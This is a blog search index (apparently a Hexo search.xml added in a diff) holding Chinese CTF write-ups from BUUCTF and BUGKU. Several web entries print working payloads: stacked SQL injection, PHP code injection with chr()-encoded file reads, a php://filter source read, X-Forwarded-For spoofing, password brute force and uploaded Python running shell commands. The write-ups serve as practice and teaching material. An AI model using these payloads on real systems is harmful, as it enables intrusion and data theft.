@@ -1,0 +1,220 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>《BUUCTF WEB 随便注》</title>
+      <link href="/2023/02/03/2023%E5%B9%B42%E6%9C%883%E6%97%A520%EF%BC%9A07/"/>
+      <url>/2023/02/03/2023%E5%B9%B42%E6%9C%883%E6%97%A520%EF%BC%9A07/</url>
+      
+        <content type="html"><![CDATA[<p>2023年2月3日20：07</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>启动靶机打开网址<br><img src="https://tuchuang.voooe.cn/images/2023/02/03/2023020301.png" alt="alt"><br>既然题目都说随便注了<br>那就随便输入几个数字呗<br>结果都跳出来一些没用的东西<br>那试试输入一些查询命令看看内部有些什么吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">先查看数据库</span><br><span class="line">1<span class="string">&#x27;;show databases;#</span></span><br></pre></td></tr></table></figure><p><img src="https://tuchuang.voooe.cn/images/2023/02/03/2023020302.png" alt="alt"><br>并没有什么有用的信息<br>再看看列表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;show tables;#</span></span><br></pre></td></tr></table></figure><p><img src="https://tuchuang.voooe.cn/images/2023/02/03/2023020303.png" alt="alt"><br>有两个列表words和1919810931114514<br>再分别查看这两个列表内的数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;show columns from `words`;#</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;show columns from `1919810931114514`;#</span></span><br></pre></td></tr></table></figure><p>(列表名字用反引号&#96;)<br><img src="https://tuchuang.voooe.cn/images/2023/02/03/2023020304.png" alt="alt"><br><img src="https://tuchuang.voooe.cn/images/2023/02/03/2023020305.png" alt="alt"><br>发现在1919810931114514中有flag<br>这时候需要查看flag内容<br>因为words内有两个属性data和id<br>那就猜测我输入的语句查看的是words内的数据<br>那么就需要修改这两个列表的名字再使它显示flag内容就好了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;rename table `words` to words1;</span></span><br><span class="line"><span class="string">rename table `1919810931114514` to `words`;</span></span><br><span class="line"><span class="string">alter table words change flag id varchar(100);#</span></span><br></pre></td></tr></table></figure><p>最后输入万能语句得到flag<br><img src="https://tuchuang.voooe.cn/images/2023/02/03/2023020306.png" alt="alt"></p><h2 id="简答"><a href="#简答" class="headerlink" title="简答"></a>简答</h2><p>sql语句堆叠生效</p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>《BUUCTF MISC file header》</title>
+      <link href="/2023/01/26/2023%E5%B9%B41%E6%9C%8826%E6%97%A510%EF%BC%9A32/"/>
+      <url>/2023/01/26/2023%E5%B9%B41%E6%9C%8826%E6%97%A510%EF%BC%9A32/</url>
+      
+        <content type="html"><![CDATA[<p>2023年1月26日10：32</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>下载附件是一个图片<br>但是图片损坏看不了<br><img src="https://tuchuang.voooe.cn/images/2023/01/26/2023012601.png" alt="alt"><br>用winhex打开查看图片编码<br><img src="https://tuchuang.voooe.cn/images/2023/01/26/2023012602.png" alt="alt"><br>发现是开头编码错误，找到对应的编码修改<br><img src="https://tuchuang.voooe.cn/images/2023/01/26/2023012603.png" alt="alt"><br>保存，图片回复得到flag<br><img src="https://tuchuang.voooe.cn/images/2023/01/26/2023012604.png" alt="alt"></p><h2 id="简答"><a href="#简答" class="headerlink" title="简答"></a>简答</h2><p>图片文件格式编码，89 50 4e 47 0d (png)</p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>《BUUCTF WEB EasyCalc》</title>
+      <link href="/2023/01/18/2023%E5%B9%B41%E6%9C%8818%E6%97%A59%EF%BC%9A15/"/>
+      <url>/2023/01/18/2023%E5%B9%B41%E6%9C%8818%E6%97%A59%EF%BC%9A15/</url>
+      
+        <content type="html"><![CDATA[<p>2023年1月18日9：15</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>进入链接看到一个计算器<br><img src="https://tuchuang.voooe.cn/images/2023/01/18/2023011801.png" alt="alt"><br>随便输入一个数字和一个特殊字符<br><img src="https://tuchuang.voooe.cn/images/2023/01/18/2023011802.png" alt="alt"><br>出现了错误<br>f12查看源码看看有什么提示<br><img src="https://tuchuang.voooe.cn/images/2023/01/18/2023011803.png" alt="alt"><br>找到了一个calc.php<br>在url输入进入<br><img src="https://tuchuang.voooe.cn/images/2023/01/18/2023011804.png" alt="alt"><br>看到了这个文件里有黑名单也就是会过滤的特殊字符<br>稍微构造一下函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/calc.php? num=1;var_dump(scandir(chr(47)))</span><br><span class="line">47是/的ASCII码的数值</span><br><span class="line">var_dump用来打印</span><br><span class="line">scandir作用和<span class="built_in">ls</span>类似查看目录文件</span><br></pre></td></tr></table></figure><p><img src="https://tuchuang.voooe.cn/images/2023/01/18/2023011805.png" alt="alt"><br>看到里面有一个f1agg<br>同理再次构造函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">calc.php? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br><span class="line">file_get_contents和<span class="built_in">cat</span>查看文件类似</span><br></pre></td></tr></table></figure><p>输入后得到flag<br><img src="https://tuchuang.voooe.cn/images/2023/01/18/2023011806.png" alt="alt"></p><h2 id="简答"><a href="#简答" class="headerlink" title="简答"></a>简答</h2><p>使用ascii码跳过黑名单过滤</p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>《BUGKU Misc telnet》</title>
+      <link href="/2023/01/15/2023%E5%B9%B41%E6%9C%8815%E6%97%A516%EF%BC%9A54/"/>
+      <url>/2023/01/15/2023%E5%B9%B41%E6%9C%8815%E6%97%A516%EF%BC%9A54/</url>
+      
+        <content type="html"><![CDATA[<p>2023年1月15日16：54</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>下载附件<br>得到后缀为pcap的文件<br>我们可以用wireshark打开<br><img src="https://tuchuang.voooe.cn/images/2023/01/15/2023011504.png" alt="alt"><br>看题目得到提示flag可能在telnet内<br>之后再进行过滤，在过滤栏输入telnet<br><img src="https://tuchuang.voooe.cn/images/2023/01/15/2023011501.png" alt="alt"><br>得到了这个文件中所有的telnet数据<br>再进行文件内容过滤搜索ctrl+f调出搜索输入flag<br><img src="https://tuchuang.voooe.cn/images/2023/01/15/2023011502.png" alt="alt"><br>进行几次搜索之后看到其中一个数据中藏有flag<br><img src="https://tuchuang.voooe.cn/images/2023/01/15/2023011503.png" alt="alt"></p><h2 id="简答"><a href="#简答" class="headerlink" title="简答"></a>简答</h2><p>后缀pcap为数据流文件用wireshark打开过滤搜索</p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>《BUUCTF Misc 一叶障目》</title>
+      <link href="/2023/01/13/2023%E5%B9%B41%E6%9C%8813%E6%97%A515%EF%BC%9A40/"/>
+      <url>/2023/01/13/2023%E5%B9%B41%E6%9C%8813%E6%97%A515%EF%BC%9A40/</url>
+      
+        <content type="html"><![CDATA[<p>2023年1月13日15：40</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>下载附件<br>得到一张图片<br>用了很多工具都没什么线索，放进kali里看看<br>发现根本就没有图片显示<br>还说了CRC错误<br><img src="https://tuchuang.voooe.cn/images/2023/01/13/2023011301.png" alt="alt"><br>网上查一下说是修改了高宽度所以出现了错误<br>找一下修复脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">import zlib</span><br><span class="line">import struct</span><br><span class="line"><span class="comment">#读文件</span></span><br><span class="line">file = <span class="string">&#x27;1.png&#x27;</span>  <span class="comment">#注意，1.png图片要和脚本在同一个文件夹下哦~</span></span><br><span class="line">fr = open(file,<span class="string">&#x27;rb&#x27;</span>).<span class="built_in">read</span>()</span><br><span class="line">data = bytearray(fr[12:29])</span><br><span class="line">crc32key = <span class="built_in">eval</span>(str(fr[29:33]).replace(<span class="string">&#x27;\\x&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&quot;b&#x27;&quot;</span>,<span class="string">&#x27;0x&#x27;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line"><span class="comment">#crc32key = 0xCBD6DF8A #补上0x，copy hex value</span></span><br><span class="line"><span class="comment">#data = bytearray(b&#x27;\x49\x48\x44\x52\x00\x00\x01\xF4\x00\x00\x01\xF1\x08\x06\x00\x00\x00&#x27;)  #hex下copy grep hex</span></span><br><span class="line">n = 4095 <span class="comment">#理论上0xffffffff,但考虑到屏幕实际，0x0fff就差不多了</span></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> range(n):<span class="comment">#高和宽一起爆破</span></span><br><span class="line">    width = bytearray(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, w))<span class="comment">#q为8字节，i为4字节，h为2字节</span></span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> range(n):</span><br><span class="line">        height = bytearray(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, h))</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(4):</span><br><span class="line">            data[x+4] = width[x]</span><br><span class="line">            data[x+8] = height[x]</span><br><span class="line">            <span class="comment">#print(data)</span></span><br><span class="line">        crc32result = zlib.crc32(data)</span><br><span class="line">        <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">            <span class="built_in">print</span>(width,height)</span><br><span class="line">            <span class="comment">#写文件</span></span><br><span class="line">            newpic = bytearray(fr)</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> range(4):</span><br><span class="line">                newpic[x+16] = width[x]</span><br><span class="line">                newpic[x+20] = height[x]</span><br><span class="line">            fw = open(file+<span class="string">&#x27;.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)<span class="comment">#保存副本</span></span><br><span class="line">            fw.write(newpic)</span><br><span class="line">            fw.close</span><br></pre></td></tr></table></figure><p>执行后得到一张图片<br><img src="https://tuchuang.voooe.cn/images/2023/01/13/2023011302.png" alt="alt"><br>得到flag</p><h2 id="简答"><a href="#简答" class="headerlink" title="简答"></a>简答</h2><p>CRC报错修复高宽度得到正常图片</p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>《BUGKU WEB 本地管理员》</title>
+      <link href="/2023/01/11/2023%E5%B9%B41%E6%9C%8811%E6%97%A517%EF%BC%9A57/"/>
+      <url>/2023/01/11/2023%E5%B9%B41%E6%9C%8811%E6%97%A517%EF%BC%9A57/</url>
+      
+        <content type="html"><![CDATA[<p>2023年1月11日17：57</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>启动场景进入链接<br>发现需要输入账户和密码<br><img src="https://tuchuang.voooe.cn/images/2023/01/11/2023011101.png" alt="alt"><br>f12看看有没有给什么提示<br><img src="https://tuchuang.voooe.cn/images/2023/01/11/2023011102.png" alt="alt"><br>发现有一串base64编码的密文<br>解码得到明文<br><img src="https://tuchuang.voooe.cn/images/2023/01/11/2023011103.png" alt="alt"><br>平常管理员账户都默认是admin<br>那试试密码test123<br><img src="https://tuchuang.voooe.cn/images/2023/01/11/2023011104.png" alt="alt"><br><img src="https://tuchuang.voooe.cn/images/2023/01/11/2023011105.png" alt="alt"><br>禁止访问，请使用本地管理员登录，这是个提示<br>先抓包<br><img src="https://tuchuang.voooe.cn/images/2023/01/11/2023011106.png" alt="alt"><br>把抓到的包放进repeater内<br><img src="https://tuchuang.voooe.cn/images/2023/01/11/2023011107.png" alt="alt"><br>然后打开火狐的X—forward修改一下ip为127.0.0.1(本地ip)<br>然后给抓到的包增加一条</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:127.0.0.1</span><br></pre></td></tr></table></figure><p><img src="https://tuchuang.voooe.cn/images/2023/01/11/2023011108.png" alt="alt"><br><img src="https://tuchuang.voooe.cn/images/2023/01/11/2023011109.png" alt="alt"><br>发送得到flag</p><h2 id="简答"><a href="#简答" class="headerlink" title="简答"></a>简答</h2><p>修改本地ip登录bp发包进入</p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>《BUGKU WEB 好像需要密码》</title>
+      <link href="/2023/01/09/2023%E5%B9%B41%E6%9C%889%E6%97%A516%EF%BC%9A17/"/>
+      <url>/2023/01/09/2023%E5%B9%B41%E6%9C%889%E6%97%A516%EF%BC%9A17/</url>
+      
+        <content type="html"><![CDATA[<p>2023年1月9日16：17</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>启动场景进入链接<br>发现需要输入密码才给flag<br>f12看看有没有给什么提示<br><img src="https://tuchuang.voooe.cn/images/2023/01/09/2023010901.png" alt="alt"><br>发现没有什么有用的提示<br>直接上字典爆破吧<br>用<a href="http://www.mutousoft.com/portal.php?mod=view&aid=37">mutou</a>生成字典(五位数密码)<br><img src="https://tuchuang.voooe.cn/images/2023/01/09/2023010902.png" alt="alt"><br><img src="https://tuchuang.voooe.cn/images/2023/01/09/2023010903.png" alt="alt"><br>再到题目那里随便输入一个密码提交抓包<br><img src="https://tuchuang.voooe.cn/images/2023/01/09/2023010904.png" alt="alt"><br>把抓到的包放进intruder内<br><img src="https://tuchuang.voooe.cn/images/2023/01/09/2023010905.png" alt="alt"><br>再进入payload界面把mutou.txt导入进去<br><img src="https://tuchuang.voooe.cn/images/2023/01/09/2023010906.png" alt="alt"><br>如果想加快爆破速度也可以修改一下数值<br><img src="https://tuchuang.voooe.cn/images/2023/01/09/2023010907.png" alt="alt"><br>开始爆破<br>爆破后看到有长度不一样的一条密码<br><img src="https://tuchuang.voooe.cn/images/2023/01/09/2023010908.png" alt="alt"><br>这就是我们需要的密码了<br>把密码输入得到flag<br><img src="https://tuchuang.voooe.cn/images/2023/01/09/2023010909.png" alt="alt"></p><h2 id="简答"><a href="#简答" class="headerlink" title="简答"></a>简答</h2><p>自生成字典bp爆破获取密码</p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>《BUGKU WEB bp》</title>
+      <link href="/2023/01/08/2023%E5%B9%B41%E6%9C%888%E6%97%A512%EF%BC%9A30/"/>
+      <url>/2023/01/08/2023%E5%B9%B41%E6%9C%888%E6%97%A512%EF%BC%9A30/</url>
+      
+        <content type="html"><![CDATA[<p>2023年1月8日12：30</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>启动场景进入链接<br>发现是个用户登录界面用户名已经自动填了<br>随便输入一个密码显示不对<br><img src="https://tuchuang.voooe.cn/images/2023/01/08/2023010801.png" alt="alt"><br>题目又是bp，还有提示弱密码top1000<br>所以直接选择用bp爆破密码<br>在网上下载弱密码top1000的文档<br><a href="https://wwzc.lanzouf.com/ii5IA0iesvna">下载地址</a><br>在httphistory里找到抓到的包<br><img src="https://tuchuang.voooe.cn/images/2023/01/08/2023010802.png" alt="alt"><br>传到intruder内修改一下需要爆破的位置<br><img src="https://tuchuang.voooe.cn/images/2023/01/08/2023010803.png" alt="alt"><br>再进入payload界面把top1000.txt导入进去<br>开始爆破<br>爆破完毕发现并没有出现一个特殊的密码<br>随便点击一个密码看看<br><img src="https://tuchuang.voooe.cn/images/2023/01/08/2023010804.png" alt="alt"><br>发现需要输入新的过滤才能顺利爆破成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;code: <span class="string">&#x27;bugku10000&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><p>加入过滤<br><img src="https://tuchuang.voooe.cn/images/2023/01/08/2023010805.png" alt="alt"><br>再次爆破后出现密码<br><img src="https://tuchuang.voooe.cn/images/2023/01/08/2023010806.png" alt="alt"></p><h2 id="简答"><a href="#简答" class="headerlink" title="简答"></a>简答</h2><p>bp抓包后使用弱密码top1000字典爆破密码</p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>《BUUCTF WEB secret file》</title>
+      <link href="/2023/01/07/2023%E5%B9%B41%E6%9C%887%E6%97%A512%EF%BC%9A07/"/>
+      <url>/2023/01/07/2023%E5%B9%B41%E6%9C%887%E6%97%A512%EF%BC%9A07/</url>
+      
+        <content type="html"><![CDATA[<p>2023年1月7日12：07</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>启动场景进入链接<br>发现除了一句话什么都没有<br>所以点击f12查看源代码<br><img src="https://tuchuang.voooe.cn/images/2023/01/08/2023010701.png" alt="alt"><br>看到有一个其他链接<br>点进去<br><img src="https://tuchuang.voooe.cn/images/2023/01/08/2023010702.png" alt="alt"><br>点击secret<br><img src="https://tuchuang.voooe.cn/images/2023/01/08/2023010703.png" alt="alt"><br>提示说太快了，没看到<br>所以考虑用bp抓包<br><img src="https://tuchuang.voooe.cn/images/2023/01/08/2023010704.png" alt="alt"><br>抓到发现里面有一个secr3t.php<br>所以明白了在转到end.php之前会通过secr3t.php<br>修改url<br><img src="https://tuchuang.voooe.cn/images/2023/01/08/2023010705.png" alt="alt"><br>进入一个源代码界面<br>发现过滤了一些命令但是没有过滤file<br>所以在url输入命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secr3t?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p><img src="https://tuchuang.voooe.cn/images/2023/01/08/2023010706.png" alt="alt"><br>得到了一段base64编码<br>在网站解码得到flag<br><img src="https://tuchuang.voooe.cn/images/2023/01/08/2023010707.png" alt="alt"></p><h2 id="简答"><a href="#简答" class="headerlink" title="简答"></a>简答</h2><p>bp抓包查看运行过程<br>通过过滤内容选择合适的命令达到目的</p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>《BUGKU WEB Flask_FileUpload》</title>
+      <link href="/2023/01/06/2023%E5%B9%B41%E6%9C%886%E6%97%A520%EF%BC%9A27/"/>
+      <url>/2023/01/06/2023%E5%B9%B41%E6%9C%886%E6%97%A520%EF%BC%9A27/</url>
+      
+        <content type="html"><![CDATA[<p>2023年1月6日20：27</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>启动场景进入链接发现让传什么东西<br>f12查看源代码<br>把注释的那段翻译一下就是发过来的东西都会用python跑一遍<br>所以随便找一个图片传上去然后bp抓包<br><img src="https://tuchuang.voooe.cn/images/2023/01/08/2023010601.png" alt="alt"><br>把图片编码换成下面指令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">inport os</span><br><span class="line"><span class="built_in">print</span>(os.system(<span class="string">&#x27;ls -al&#x27;</span>))</span><br></pre></td></tr></table></figure><p><img src="https://tuchuang.voooe.cn/images/2023/01/08/2023010602.png" alt="alt"><br>发现真的跑了一遍，把文件都列出来了<br>那么就开始看flag是什么吧<br>再次修改指令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">inport os</span><br><span class="line"><span class="built_in">print</span>(os.system(<span class="string">&#x27;cat ../flag&#x27;</span>))</span><br></pre></td></tr></table></figure><p><img src="https://tuchuang.voooe.cn/images/2023/01/08/2023010603.png" alt="alt"><br>得到flag</p><h2 id="简答"><a href="#简答" class="headerlink" title="简答"></a>简答</h2><p>传入文件若文件内容会按照python运行则修改发送文件内容<br>inport os<br>print(os.system(‘****’)) *指令</p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>《BUGKU WEB 源代码》</title>
+      <link href="/2023/01/05/2023%E5%B9%B41%E6%9C%885%E6%97%A510%EF%BC%9A48/"/>
+      <url>/2023/01/05/2023%E5%B9%B41%E6%9C%885%E6%97%A510%EF%BC%9A48/</url>
+      
+        <content type="html"><![CDATA[<p>2023年1月5日10：48</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>启动场景进入链接<br><img src="https://tuchuang.voooe.cn/images/2023/01/08/2023010501.png" alt="alt"><br>题目提示查看源代码<br><img src="https://tuchuang.voooe.cn/images/2023/01/08/2023010502.png" alt="alt"><br>可以看到有三行有类似于加密密文，查询得知是escape编码<br>进入escape在线解码的网站<a href="https://tool.uvooc.com/escape/">Escape在线解码</a><br>通过解码可以得到一些代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">checkSubmit</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">var a=document.getElementById(<span class="string">&quot;password&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;undefined&quot;</span>!=typeof a)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;</span>==a.value)</span><br><span class="line"><span class="built_in">return</span>!0;</span><br><span class="line">alert(<span class="string">&quot;Error&quot;</span>);a.focus();</span><br><span class="line"><span class="built_in">return</span>!1</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById(<span class="string">&quot;levelQuest&quot;</span>).onsubmit=checkSubmit;</span><br></pre></td></tr></table></figure><p>得知key就是67d709b2b54aa2aa648cf6e87a7114f1<br>返回题目网站输入提交即可得到flag<br><img src="https://tuchuang.voooe.cn/images/2023/01/08/2023010503.png" alt="alt"></p><h2 id="简答"><a href="#简答" class="headerlink" title="简答"></a>简答</h2><p>Escape编码<a href="https://tool.uvooc.com/escape/">Escape在线解码</a><br>%**长加密</p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>《BUUCTF Misc SXMgdGhpcyBiYXNlPw==》</title>
+      <link href="/2023/01/03/2023%E5%B9%B41%E6%9C%883%E6%97%A515%EF%BC%9A47/"/>
+      <url>/2023/01/03/2023%E5%B9%B41%E6%9C%883%E6%97%A515%EF%BC%9A47/</url>
+      
+        <content type="html"><![CDATA[<p>2023年1月3日15：47</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>下载附件得到flag.txt，看一眼全是base64的编码格式。<br>索性直接去网上复制了一份base64编码的python脚本。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import <span class="built_in">base64</span></span><br><span class="line"></span><br><span class="line">def int2Bin(digit):</span><br><span class="line"><span class="built_in">return</span> bin(digit)[2:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def binAsc(string):</span><br><span class="line">temp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(int(len(string) / 8)):</span><br><span class="line">temp += chr(int(string[i * 8 : i* 8 + 8] , 2))</span><br><span class="line"><span class="built_in">return</span> temp</span><br><span class="line"></span><br><span class="line">def readBase64FromFile(filename):</span><br><span class="line">Base64Char = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>  </span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">with open(filename ,<span class="string">&#x27;r&#x27;</span>) as f:</span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> f.readlines():</span><br><span class="line"><span class="keyword">if</span> data.find(<span class="string">&#x27;==&#x27;</span>) &gt; 0:</span><br><span class="line">result += int2Bin(Base64Char.index(data[-4]))[-4:]</span><br><span class="line"><span class="keyword">elif</span> data.find(<span class="string">&#x27;=&#x27;</span>) &gt; 0:</span><br><span class="line">result += int2Bin(Base64Char.index(data[-3]))[-2:]</span><br><span class="line"><span class="built_in">print</span>(binAsc(result))</span><br><span class="line"></span><br><span class="line">readBase64FromFile(<span class="string">&#x27;flag.txt&#x27;</span>)<span class="comment">#需要解码的文件名称</span></span><br></pre></td></tr></table></figure><p>执行后解出flag<br>GXY{fazhazhenhaoting}</p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+  
+  
+    
+    
+    <entry>
+      <title>关于</title>
+      <link href="/about/index.html"/>
+      <url>/about/index.html</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>音乐</title>
+      <link href="/music/index.html"/>
+      <url>/music/index.html</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>友链</title>
+      <link href="/link/index.html"/>
+      <url>/link/index.html</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>图片</title>
+      <link href="/movies/index.html"/>
+      <url>/movies/index.html</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>密码类型及解码在线网站</title>
+      <link href="/tags/index.html"/>
+      <url>/tags/index.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="随时更新"><a href="#随时更新" class="headerlink" title="随时更新"></a>随时更新</h2><p>&amp;#107;<a href="https://www.matools.com/code-convert-unicode">解码链接</a></p>]]></content>
+      
+    </entry>
+    
+    
+  
+</search>
